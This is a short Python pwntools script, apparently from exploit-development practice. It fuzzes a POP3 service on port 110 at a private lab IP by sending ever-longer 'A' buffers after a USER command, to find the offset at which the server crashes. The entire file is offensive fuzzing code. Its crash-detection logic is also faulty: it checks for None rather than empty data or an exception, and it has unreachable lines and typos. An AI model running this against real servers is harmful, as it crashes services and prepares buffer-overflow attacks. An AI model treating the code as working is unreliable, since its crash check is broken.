#!/usr/bin/python

import sys
from pwn import *
import time

ip = "10.211.56.25"
port = 110

#--- Debugging Option For Developer ---#

context.log_level = "debug"

def check_connection(ip,port):
    p = remote(ip,port)
    response = p.recvline()
    
    if response:
        print("Connect Success")
        return True
    else:
        print("Connect Failed")
        sys.exit()
        return False
    
    p.close()
           
def fuzzing(ip,port):
    p = remote(ip,port)
    p.sendline("USER test")
    res = p.recvline()
    
    if res:
        print("Finding Offset...")
        p.sendline("Check-Connetion")
        offset = 1
    else:
        print("Can't Find Offset ..")
        sys.exit()
   
    print("*"*150)    
    
    while True:
        p = remote(ip,port)
        pay = b'A'*offset
        p.sendline("USER test")
        p.recvuntil("+OK test welcome here")
        p.sendline(pay)
        res = p.recv(1024)
        #pause()
        
        if res:
            print("Succes Send Data [Bytes: " + str(len(pay)) + "]")
            offset+=100
            p.close()
        elif res == None:
            print("Crashed..")
            print("Offset is " + str(len(pay))) 
            print("Send Finally Payload : " + pay.decode())
            print("*"*150)
            sys.exit()
            p.close()
    
    
    
def main():
    
    check_connect = check_connection(ip,port)
    
    if check_connect == True:
        fuzzing(ip,port)
    
    
if __name__ == "__main__":
    main()
    
